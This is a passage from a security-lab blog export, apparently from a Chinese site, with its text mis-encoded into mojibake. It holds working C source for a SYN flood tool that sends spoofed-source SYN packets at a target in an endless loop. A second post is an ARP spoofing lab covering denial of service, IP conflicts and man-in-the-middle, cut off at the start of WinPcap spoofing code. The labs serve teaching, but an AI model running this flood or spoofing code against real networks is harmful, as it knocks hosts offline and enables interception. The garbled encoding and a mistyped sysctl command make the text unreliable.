ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%då·²æ”»å‡»!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 å®éªŒç»“è®º udp_floodæ”»å‡»å°±æ˜¯æ„é€ å¤§é‡çš„udpåŒ…(å¯ä»¥æºå¸¦å°‘é‡æ•°æ®ï¼Œä¹Ÿå¯ä»¥æºå¸¦å¤§é‡æ•°æ®ï¼Œæºå¸¦æ•°æ®é‡è¶Šå¤§å¯¹æœåŠ¡å™¨çš„è½½è·æ‰¿å—å°±è¶Šä¸¥é‡)ï¼Œå ç”¨æœåŠ¡å™¨å¤§é‡çš„å¤„ç†å†…å­˜ï¼Œä»è€Œå¼•èµ·æœåŠ¡å™¨å´©æºƒã€‚\nSYN-Floodä¸‰ç§æ”»å‡»æ–¹å¼\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» é˜²å¾¡æ‰‹æ®µ\nUdp_Flood\nå¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ¨åˆ†é™åˆ¶äº†ICMPæŠ¥æ–‡çš„å“åº”é€Ÿç‡ï¼Œä»¥ä¸­æ–­éœ€è¦ICMPå“åº”çš„DDoSæ”»å‡»ã€‚è¿™ç§ç¼“è§£çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯åœ¨æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œåˆæ³•çš„æ•°æ®åŒ…ä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ã€‚å¦‚æœUDP Floodçš„å®¹é‡è¶³å¤Ÿé«˜ä»¥ä½¿ç›®æ ‡æœåŠ¡å™¨çš„é˜²ç«å¢™çš„çŠ¶æ€è¡¨é¥±å’Œï¼Œåˆ™åœ¨æœåŠ¡å™¨çº§åˆ«å‘ç”Ÿçš„ä»»ä½•ç¼“è§£éƒ½å°†ä¸è¶³ä»¥åº”å¯¹ç›®æ ‡è®¾å¤‡ä¸Šæ¸¸çš„ç“¶é¢ˆã€‚ åˆ¤æ–­åŒ…å¤§å°ï¼Œå¦‚æœæ˜¯å¤§åŒ…æ”»å‡»åˆ™ä½¿ç”¨é˜²æ­¢UDPç¢ç‰‡æ–¹æ³•ï¼šæ ¹æ®æ”»å‡»åŒ…å¤§å°è®¾å®šåŒ…ç¢ç‰‡é‡ç»„å¤§å°ï¼Œé€šå¸¸ä¸å°äº1500ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘ä¸¢å¼ƒæ‰€æœ‰UDPç¢ç‰‡ã€‚ SYN-Flood\nç¼©çŸ­è¶…æ—¶ï¼ˆSYN Timeoutï¼‰æ—¶é—´\nç”±äºSYN Floodæ”»å‡»çš„æ•ˆæœå–å†³äºæœåŠ¡å™¨ä¸Šä¿æŒçš„SYNåŠè¿æ¥æ•°ï¼Œè¿™ä¸ªå€¼=SYNæ”»å‡»çš„é¢‘åº¦ x SYN Timeoutï¼Œæ‰€ä»¥é€šè¿‡ç¼©çŸ­ä»æ¥æ”¶åˆ°SYNæŠ¥æ–‡åˆ°ç¡®å®šè¿™ä¸ªæŠ¥æ–‡æ— æ•ˆå¹¶ä¸¢å¼ƒæ”¹è¿æ¥çš„æ—¶é—´ï¼Œä¾‹å¦‚è®¾ç½®ä¸º20ç§’ä»¥ä¸‹ï¼Œå¯ä»¥æˆå€çš„é™ä½æœåŠ¡å™¨çš„è´Ÿè·ã€‚ä½†è¿‡ä½çš„SYN Timeoutè®¾ç½®å¯èƒ½ä¼šå½±å“å®¢æˆ·çš„æ­£å¸¸è®¿é—®ã€‚\næ³¨æ„ï¼šç¼©çŸ­SYN Timeoutæ—¶é—´ä»…åœ¨å¯¹æ–¹æ”»å‡»é¢‘åº¦ä¸é«˜çš„æƒ…å†µä¸‹ç”Ÿæ•ˆ\nå¢åŠ æœ€å¤§åŠè¿æ¥æ•°\nMore Actionsåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -agrep net.ipv4.tcp_max_syn_backlogâ€å¯ä»¥æŸ¥çœ‹æœ€å¤§åŠè¿æ¥æ•°ï¼Œä¸€èˆ¬æ¥è¯´å¤§å°ä¸º128ï¼Œè¿™ä¸ªé»˜è®¤å€¼å¯¹äºWebæœåŠ¡å™¨æ¥è¯´æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œä¸€æ¬¡ç®€å•çš„SYNæ”»å‡»å°±è¶³ä»¥å°†å…¶å®Œå…¨å ç”¨ã€‚ å› æ­¤ï¼Œé˜²å¾¡DOSæ”»å‡»æœ€ç®€å•çš„åŠæ³•å°±æ˜¯å¢å¤§è¿™ä¸ªé»˜è®¤å€¼ï¼Œåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -w et.ipv4.tcp_max_syn_backlog=3000â€ï¼Œè¿™æ ·å°±å¯ä»¥å°†é˜Ÿåˆ—SYNæœ€å¤§åŠè¿æ¥æ•°å®¹é‡å€¼æ”¹ä¸º3000äº† è¿‡æ»¤ç½‘å…³é˜²æŠ¤\nä¸€ç§æ–¹å¼æ˜¯é˜²æ­¢å¢™ç¡®è®¤è¿æ¥çš„æœ‰æ•ˆæ€§åï¼Œé˜²ç«å¢™æ‰ä¼šå‘å†…éƒ¨æœåŠ¡å™¨å‘èµ·SYNè¯·æ±‚ã€‚é˜²ç«å¢™ä»£æœåŠ¡å™¨å‘å‡ºçš„SYN ACKåŒ…ä½¿ç”¨çš„åºåˆ—å·ä¸ºc, è€ŒçœŸæ­£çš„æœåŠ¡å™¨å›åº”çš„åºåˆ—å·ä¸ºcâ€™, è¿™æ ·ï¼Œåœ¨æ¯ä¸ªæ•°æ®æŠ¥æ–‡ç»è¿‡é˜²ç«å¢™çš„æ—¶å€™è¿›è¡Œåºåˆ—å·çš„ä¿®æ”¹ã€‚\nå¦ä¸€ç§æ–¹å¼æ˜¯é˜²ç«å¢™ç¡®å®šäº†è¿æ¥çš„å®‰å…¨åï¼Œä¼šå‘å‡ºä¸€ä¸ªsafe resetå‘½ä»¤ï¼Œclientä¼šè¿›è¡Œé‡æ–°è¿æ¥ï¼Œè¿™æ—¶å‡ºç°çš„synæŠ¥æ–‡ä¼šç›´æ¥æ”¾è¡Œã€‚è¿™æ ·ä¸éœ€è¦ä¿®æ”¹åºåˆ—å·äº†ã€‚ä½†æ˜¯ï¼Œclientéœ€è¦å‘èµ·ä¸¤æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œå› æ­¤å»ºç«‹è¿æ¥çš„æ—¶é—´å°†ä¼šå»¶é•¿ã€‚\nSYN cookiesæŠ€æœ¯\nç»™æ¯ä¸€ä¸ªè¯·æ±‚è¿æ¥çš„IPåœ°å€åˆ†é…ä¸€ä¸ªCookieï¼Œå¦‚æœçŸ­æ—¶é—´å†…è¿ç»­å—åˆ°æŸä¸ªIPçš„é‡å¤SYNæŠ¥æ–‡ï¼Œå°±è®¤å®šæ˜¯å—åˆ°äº†æ”»å‡»ï¼Œå¹¶è®°å½•åœ°å€ä¿¡æ¯ï¼Œä»¥åä»è¿™ä¸ªIPåœ°å€æ¥çš„åŒ…ä¼šè¢«ä¸€æ¦‚ä¸¢å¼ƒã€‚è¿™æ ·åšçš„ç»“æœä¹Ÿå¯èƒ½ä¼šå½±å“åˆ°æ­£å¸¸ç”¨æˆ·çš„è®¿é—®ã€‚ ","permalink":"http://www.reus09.top/posts/tech/ddos/","summary":"æ‹’ç»æœåŠ¡æ”»å‡» 0x01 å®éªŒç›®çš„ ä½¿ç”¨udp floodã€é˜¿æ‹‰ä¸ç­‰å·¥å…·ï¼Œåˆ†ç»„å±•å¼€æ”»å‡»å¹¶åˆ©ç”¨wiresharkåˆ†æã€‚ ç¼–ç¨‹å®ç°SYN Floodæ”»å‡»ã€‚ 0x02 å®éªŒå‰æ","title":"DDos"},{"content":"ARPæ¬ºéª—å®éªŒ 0x01 å®éªŒå‰æçŸ¥è¯† ARPåè®®çš„å®‰å…¨é—®é¢˜ ARPåè®®æ˜¯å»ºç«‹åœ¨ä¿¡ä»»å±€åŸŸç½‘å†…æ‰€æœ‰ç»“ç‚¹çš„åŸºç¡€ä¸Šçš„ï¼Œå®ƒé«˜æ•ˆï¼Œä½†å´ä¸å®‰å…¨ã€‚\nARPé«˜é€Ÿç¼“å­˜æ ¹æ®æ‰€æ¥æ”¶åˆ°çš„ARPåè®®åŒ…éšæ—¶è¿›è¡ŒåŠ¨æ€æ›´æ–°ï¼Œå®ƒæ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œä¸ä¼šæ£€æŸ¥è‡ªå·±æ˜¯å¦å‘è¿‡è¯·æ±‚åŒ…ï¼Œåªè¦æ”¶åˆ°ç›®æ ‡MACæ˜¯è‡ªå·±çš„ARPå“åº”æ•°æ®åŒ…æˆ–ARPå¹¿æ’­åŒ…ï¼Œéƒ½ä¼šæ¥å—å¹¶ç¼“å­˜ã€‚\nARPåè®®æ²¡æœ‰è®¤è¯æœºåˆ¶ï¼Œåªè¦æ¥æ”¶åˆ°çš„åè®®åŒ…æ˜¯æœ‰æ•ˆçš„ï¼Œä¸»æœºå°±æ— æ¡ä»¶åœ°æ ¹æ®åè®®åŒ…çš„å†…å®¹åˆ·æ–°æœ¬æœºARPç¼“å­˜ï¼Œå¹¶ä¸æ£€æŸ¥è¯¥åè®®åŒ…çš„åˆæ³•æ€§ã€‚\nå› æ­¤æ”»å‡»è€…å¯ä»¥éšæ—¶å‘é€è™šå‡ARPåŒ…æ›´æ–°è¢«æ”»å‡»ä¸»æœºä¸Šçš„ARPç¼“å­˜ï¼Œè¿›è¡Œåœ°å€æ¬ºéª—æˆ–æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nARP Reply Spoofing æ„é€ è™šå‡çš„ARPå“åº”åŒ…ï¼Œç¯¡æ”¹ç›®æ ‡ä¸»æœºçš„MACåœ°å€ï¼Œä¾‹ï¼š\nå¹¿æ’­æ”»å‡» å½“æ•°æ®åŒ…çš„ç›®æ ‡MACåœ°å€ä¸ºFF:FF:FF:FF:FF:FFï¼Œè¯¥æ•°æ®åŒ…å°†ä¼šè¢«å¹¿æ’­ã€‚æ„é€ å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºç½‘å…³IPï¼Œè€ŒMACåœ°å€ä¸ºå¹¿æ’­åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™ç½‘å…³çš„æ•°æ®åŒ…éƒ½å°†è¢«å¹¿æ’­ã€‚è¿™æ—¢æ˜¯ä¸€ç§å—…æ¢æ–¹æ³•ï¼Œä¹Ÿå¯ä½œä¸ºå¹²æ‰°ç½‘ç»œæœåŠ¡çš„æ”»å‡»æ–¹æ³•ã€‚ æ‹’ç»æœåŠ¡æ”»å‡» æ„é€ è™šå‡å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºå…³é”®æœåŠ¡çš„IPåœ°å€ï¼Œä¾‹å¦‚ç½‘å…³ï¼Œè€ŒMACåœ°å€ä¸ºä¸å­˜åœ¨çš„è™šå‡åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™å…³é”®æœåŠ¡ï¼ˆå¦‚ç½‘å…³ï¼‰çš„æ•°æ®åŒ…éƒ½å°†ä¸¢å¤±ï¼Œä»è€Œå½¢æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ ä¸­é—´äººæ”»å‡» 0x02 å®éªŒå·¥å…·åŠç¯å¢ƒ éƒ¨ç½²äºåŒä¸€å±€åŸŸç½‘ä¸‹ï¼ŒVmwareå†…éƒ¨çš„ä¸¤å°Winxp ä»¥åŠ ä¸»æœº çš„ä¸‰å°æœºå™¨ æ”»å‡»æœº win xp IP: 192.168.195.131 MAC : 00-0c-29-06-65-c9 é¶æœº win xp IP : 192.168.185.138 MAC : 00-0c-29-19-ba-6e win 10 IP : 192.168.195.1 MAC : 00-50-56-c0-00-08 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…· WinArpAttacker visual studio 19 wireshark 0x03 ä½¿ç”¨åœ¨çº¿å·¥å…·WinArpAttacker ç¦æ­¢ä¸Šç½‘åŠŸèƒ½ é¶æœº IP ï¼š 192.168.185.138\næœªè¿›è¡Œç¦æ­¢ä¸Šç½‘å‰çš„ é¶æœºçŠ¶æ€ï¼Œå¯ä»¥æ­£å¸¸ä¸Šç½‘\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 è¿›è¡Œç¦æ­¢ä¸Šç½‘æ”»å‡»\nå‘ç°æ­¤æ—¶çš„ç½‘ç«™åˆ·æ–°åæ— æ³•æ‰“å¼€ï¼Œå¹¶ä¸” è¯¥é¶æœº ä¸ ç½‘å…³ 192.168.195.2çš„MAC åœ°å€è¢«ç¯¡æ”¹ä¸º 01-01-01-01-01-01\nåˆ©ç”¨WiresharkæŠ“å–ç¦æ­¢ä¸Šç½‘çš„æµé‡åŒ…\næŠ“è·åˆ°ä¸¤æ¡arpæ•°æ®åŒ… åˆ†æç¬¬ä¸€ä¸ªarpæ•°æ®åŒ… æºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ ç½‘å…³ IP å’Œåœ°å€ ç”±æ­¤ ç½‘å…³ä¸­å­˜å–çš„ARP è¡¨ä¸­ é¶æœºIP 192.168.195.138 å¯¹åº”çš„MAC åœ°å€è¢«æ›´æ–°ä¸º 01-01-01-01-01-01 åˆ†æç¬¬äºŒä¸ªæ•°æ®åŒ… æºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸º ç½‘å…³ çš„IP : 192.168.195.2 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœºï¼ˆ192.168.195.138ï¼‰ IP å’Œåœ°å€ ç”±æ­¤ é¶æœºä¸­å­˜å–çš„ARP è¡¨ä¸­ ç½‘å…³IP 192.168.195.2 å¯¹åº”çš„MAC åœ°å€è¢«æ›´æ–°ä¸º 01-01-01-01-01-01 ç”±æ­¤å®ç°äº† ç½‘å…³å’Œé¶æœº(192.168.195.138) ä¹‹é—´çš„MACåœ°å€å‡ä¸ºé”™è¯¯çš„ç›®æ ‡æœºMACåœ°å€ï¼Œå½“é¶æœºè®¿é—®å¤–ç½‘çš„æ—¶å€™ï¼ŒMACæ— æ³•è®¿é—®æ­£ç¡®çš„ç½‘å¡ï¼ŒåŒæ—¶ç½‘å…³ä¹Ÿæ— æ³•è®¿é—® é¶æœºï¼Œä»è€Œæ— æ³•ä¸å¤–ç½‘æ•°æ®ç›¸åŒï¼Œä»è€Œæ— æ³•ä¸Šç½‘ã€‚\nIPå†²çªåŠŸèƒ½ é¶æœºIP : 192.168.195.138\næœªè¿›è¡ŒIPå†²çªå‰ï¼Œé¶æœºå¯ä»¥æ­£å¸¸ä¸Šç½‘\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 è¿›è¡Œå®šæ—¶IPå†²çªå’Œ ä¸æ–­IP å†²çªã€‚\nåœ¨é¶æœºè§‚å¯Ÿåˆ°ï¼Œç³»ç»Ÿäº§ç”Ÿæé†’ï¼š\nIPåœ°å€ä¸ç½‘ç»œä¸Šçš„å…¶ä»–ç³»ç»Ÿæœ‰å†²çªã€‚ ç”¨Wiresharkåˆ†åˆ«æŠ“åŒ… å®šæ—¶IPå†²çªå’Œä¸æ–­IPå†²çª\nå®šæ—¶IPå†²çª ä¸æ–­IPå†²çª å¯ä»¥å‘ç°ä¸æ–­IPå†²çªå³ä¸ºå°†å®šæ—¶IPå†²çªå‘é€çš„ARPåŒ… è¿ç»­å‘é€ 1000æ¬¡ å½¢æˆæ´ªæ³›æ”»å‡»è€Œå·²ã€‚\nå› æ­¤è¿™é‡Œåªéœ€è¦åˆ†æIPå†²çªçš„ ä¸€ä¸ªARP åŒ…å³å¯ã€‚\næºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœºï¼ˆ192.168.195.138ï¼‰ IP å’Œåœ°å€ ç”±æ­¤ç›¸å½“äºï¼Œé¶æœºå‘è‡ªèº«å‘é€äº†å¤§é‡MACåœ°å€ä¸ºé”™è¯¯åœ°å€01-01-01-01-01-01çš„ARPåŒ…ï¼Œä»è€Œå¼•èµ·IPå†²çªï¼Œä½¿é¶æœºæ— æ³•ä¸Šç½‘\nä¸­é—´äººæ”»å‡» å®ç°ç”¨æ”»å‡»æœº(IP:192.168.195.131) æ£€æµ‹ é¶æœº(IP:192.168.195.1) ping é¶æœº(IP : 192.168.195.138)\næ²¡æœ‰ç”¨ä¸­é—´äººæ”»å‡»å‰\nä¸»æœºping é¶æœº(192.168.195.138 ) å¯ä»¥çœ‹åˆ°é€Ÿåº¦å¾ˆ\nä¸»æœºwin 10 çš„ ARP è¡¨å¯¹åº”åœ°å€\né¶æœº win xp çš„ ARPè¡¨å¯¹åº”MAC\nå¯ä»¥çœ‹åˆ°ä¸»æœºwin10 å’Œ é¶æœºxp ä¹‹é—´çš„mac å¯¹åº”å…³ç³»æ­£ç¡®ã€‚\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 å’Œä¸»æœºwin10 IP (192.168.195.1) è¿›è¡Œç›‘ç®¡ä¸»æœºé€šè®¯\næ­¤æ—¶å†åº¦ç”±ä¸»æœºwin10 ping é¶æœº win xp\nå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ° ping å‘é€çš„æ—¶é—´é—´éš”å¤§å¹…åº¦å˜é•¿ã€‚\nä¸æ­¤åŒæ—¶ï¼Œä¸»æœºWIN10çš„ARPè¡¨ ç›®æ ‡é¶æœºip(192.168.195.138)çš„MAC åœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºIP(192.168.195.131)çš„MACåœ°å€ã€‚\nç›¸åº”çš„ï¼Œç›®æ ‡é¶æœº(IP192.168.195.138) çš„ARPè¡¨ ä¸­å¯¹åº” ä¸»æœº(IP192.168.195.1)çš„MACåœ°å€ä¹Ÿè¢«ç¯¡æ”¹ä¸ºæ”»å‡»æœºIP(192.168.195.131)çš„MACåœ°å€ã€‚\nä»¥ä¸Šå°±æ˜¯ ä¸­é—´äººæ”»å‡»ä¹‹åçš„ æ•ˆæœã€‚\nä¸‹é¢åˆ©ç”¨wiresharkè¿›è¡ŒæŠ“åŒ…ï¼Œåˆ†æARPæ•°æ®åŒ…çš„æµç¨‹ã€‚\næŠ“è·åˆ°ä¸¤ä¸ªarpæ•°æ®åŒ…\nç¬¬ä¸€ä¸ªarpæ•°æ®åŒ…\næºMAC è¢«è®¾ç½®ä¸º æ”»å‡»æœºçš„MAC åœ°å€ :00-0c-29-06-65-c9 æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ ä¸»æœºwin10 çš„ IP å’Œåœ°å€ ç”±æ­¤ä¸»æœºwin10 ä¸­ çš„arpè¡¨ï¼ŒæŒ‡å‘ç›®æ ‡é¶æœº(IP192.168.195.138)çš„macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœº(IP : 192.168.195.138)çš„MACåœ°å€ï¼Œå› æ­¤ä¸»æœºwin10å‘é€ç»™é¶æœºçš„æ•°æ® å‡å› ä¸ºmacåœ°å€è¢«å‘é€åˆ° æ”»å‡»æœºä¸Šé¢ã€‚ ç¬¬äºŒä¸ªarpæ•°æ®åŒ…\næºMAC è¢«è®¾ç½®ä¸º æ”»å‡»æœºçš„MAC åœ°å€ :00-0c-29-06-65-c9 æºIP ä¸ºé¶æœº çš„IP : 192.168.195.1 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœº win xp çš„ IP å’Œåœ°å€ ç”±æ­¤é¶æœº win xp ä¸­ çš„arpè¡¨ï¼ŒæŒ‡å‘ä¸»æœº(IP192.168.195.1)çš„macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœº(IP : 192.168.195.138)çš„MACåœ°å€ï¼Œå› æ­¤åŒæ ·é¶æœºwin xp å‘ç»™ ä¸»æœºwin 10 çš„æ•°æ®æµä¹Ÿä¼šè¢«å…ˆå‘ç»™ æ”»å‡»æœºã€‚ æ€»è€Œè¨€ä¹‹ï¼Œä¸­é—´äººæ”»å‡»å³ä¸º\næ”»å‡»è€…å‘ç›®æ ‡å‘é€è™šå‡åº”ç­”åŒ…ï¼Œå‘Šè¯‰ä¸»æœºAâ€œä¸»æœºBçš„MACåœ°å€æ˜¯MacCï¼ˆæ”»å‡»è€…MACï¼‰â€ï¼Œå‘Šè¯‰ä¸»æœºBâ€œä¸»æœºAçš„MACåœ°å€æ˜¯MacCï¼ˆæ”»å‡»è€…MACï¼‰â€\næˆåŠŸåï¼Œä¸»æœºAå‘é€ç»™ä¸»æœºBçš„æ•°æ®åŒ…è¢«è½¬å‘ç»™ä¸»æœºCï¼Œä¸»æœºBå‘é€ç»™ä¸»æœºAçš„æ•°æ®åŒ…ä¹Ÿè¢«è½¬å‘ç»™ä¸»æœºCï¼Œ\näºæ˜¯Aã€Bä¹‹é—´çš„æ•°æ®å‡è¢«Cå—…æ¢ã€‚æ”»å‡»è€…Cä¼šè½¬å‘é‡å®šå‘åˆ°è‡ªå·±çš„æ•°æ®åŒ…åˆ°æ­£ç¡®ä½ç½®ï¼Œå› æ­¤Aå’ŒBæ²¡æœ‰å¯Ÿè§‰åˆ°å—…æ¢çš„å­˜åœ¨ã€‚\n0x04 åŸºäºWinpcap å¯¹æŒ‡å®šç›®æ ‡IPè¿›è¡ŒARPæ¬ºéª—æ”»å‡» 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 #define WIN32 #define HAVE_REMOTE #include\u0026lt;stdio.h\u0026gt; typedef unsigned char u_char; typedef unsigned short u_short; typedef unsigned int u_int; #include \u0026lt;pcap.h\u0026gt; #define ETH_ARP 0x0806 //ä»¥å¤ªç½‘å¸§ç±»å‹è¡¨ç¤ºåé¢æ•°æ®çš„ç±»å‹ï¼Œå¯¹äºARPè¯·æ±‚æˆ–åº”ç­”æ¥è¯´ï¼Œè¯¥å­—æ®µçš„å€¼ä¸ºx0806 #define ARP_HARDWARE 1 //ç¡¬ä»¶ç±»å‹å­—æ®µå€¼ä¸ºè¡¨ç¤ºä»¥å¤ªç½‘åœ°å€ #define ETH_IP 0x0800 //åè®®ç±»å‹å­—æ®µè¡¨ç¤ºè¦æ˜ å°„çš„åè®®åœ°å€ç±»å‹å€¼ä¸ºx0800è¡¨ç¤ºIPåœ°å€ #define ARP_REQUEST 1 //ARPè¯·æ±‚ #define ARP_RESPONSE 2 //ARPåº”ç­” //14å­—èŠ‚ä»¥å¤ªç½‘é¦–éƒ¨ struct EthernetHeader { u_char DestMAC[6]; //ç›®çš„MACåœ°å€ 6å­—èŠ‚ u_char SourMAC[6]; //æºMACåœ°å€ 6å­—èŠ‚ u_short EthType; //ä¸Šä¸€å±‚åè®®ç±»å‹ï¼Œå¦‚0x0800ä»£è¡¨ä¸Šä¸€å±‚æ˜¯IPåè®®ï¼Œ0x0806ä¸ºarp 2å­—èŠ‚ }; //28å­—èŠ‚ARPå¸§ç»“æ„ struct ArpHeader { unsigned short 